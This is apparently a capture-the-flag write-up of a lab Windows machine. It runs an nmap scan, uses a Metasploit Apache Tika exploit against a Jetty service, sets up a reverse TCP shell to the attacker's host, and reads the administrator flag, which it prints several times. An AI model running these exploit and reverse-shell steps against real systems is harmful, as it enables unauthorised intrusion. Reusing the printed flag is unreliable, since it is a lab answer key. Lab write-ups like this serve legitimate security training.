
## 🔍 1. Reconnaissance


The target hostname is added to /etc/hosts before scanning begins.

```
echo '10.81.156.224 cyberlens.thm' >> /etc/hosts

```


![[Pasted image 20261011012109.png]]



```
nmap -Pn -sV -p- -T4 10.65.146.105 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 15:33 -0400
Nmap scan report for 10.65.146.105
Host is up (0.28s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 743.80 seconds

```

![[Pasted image 20261011022940.png]]


## Use Metasploit


```

msfconsole  
search apache tika 1.17
use exploit/windows/http/apache_tika_jp2_jscript


```


![[Pasted image 20261011023348.png]]


```

set RHOST cyberlens.thm  
set RPORT 61777  
set SSL false  
set LHOST 192.168.153.215  
set LPORT 4444  
exploit


```




![[Pasted image 20261011023536.png]]


![[Pasted image 20261011023600.png]]



![[Pasted image 20261011023643.png]]


![[Pasted image 20261011023819.png]]


![[Pasted image 20261011024051.png]]


![[Pasted image 20261011024131.png]]


```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.152.214
LHOST => 192.168.152.214
msf exploit(multi/handler) > set LPORT 4443
LPORT => 4443
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.152.214:4443 

```


![[Pasted image 20261011024347.png]]



![[Pasted image 20261011024413.png]]



```
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.152.214:4443 
[*] Command shell session 2 opened (192.168.152.214:4443 -> 10.65.146.105:50321) at 2026-10-10 16:25:41 -0400


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
-----
          

C:\Windows\system32>getuid
getuid
'getuid' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd ../../
cd ../../

C:\>cd users
cd users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

06/06/2023  07:48 PM    <DIR>          .
06/06/2023  07:48 PM    <DIR>          ..
10/10/2026  07:44 PM    <DIR>          Administrator
11/25/2023  07:31 AM    <DIR>          CyberLens
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  14,956,310,528 bytes free

C:\Users>cd Administrator\
cd Administrator\

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator

10/10/2026  07:44 PM    <DIR>          .
10/10/2026  07:44 PM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          3D Objects
03/17/2021  03:13 PM    <DIR>          Contacts
06/06/2023  07:45 PM    <DIR>          Desktop
03/17/2021  03:13 PM    <DIR>          Documents
06/06/2023  07:39 PM    <DIR>          Downloads
03/17/2021  03:13 PM    <DIR>          Favorites
03/17/2021  03:13 PM    <DIR>          Links
03/17/2021  03:13 PM    <DIR>          Music
03/17/2021  03:13 PM    <DIR>          Pictures
03/17/2021  03:13 PM    <DIR>          Saved Games
03/17/2021  03:13 PM    <DIR>          Searches
03/17/2021  03:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,956,310,528 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

06/06/2023  07:45 PM    <DIR>          .
06/06/2023  07:45 PM    <DIR>          ..
11/27/2023  07:50 PM                24 admin.txt
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,105 bytes
               2 Dir(s)  14,956,310,528 bytes free

C:\Users\Administrator\Desktop>cat admin.txt
cat admin.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{3lev@t3D-4-pr1v35c!}
C:\Users\Administrator\Desktop>msfconsole
search apache tika 1.17msfconsole
'msfconsole' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>

```


![[Pasted image 20261011024545.png]]


![[Pasted image 20261011024606.png]]




```

THM{3lev@t3D-4-pr1v35c!}
```












































admin flag.txt

```

THM{3lev@t3D-4-pr1v35c!}

```





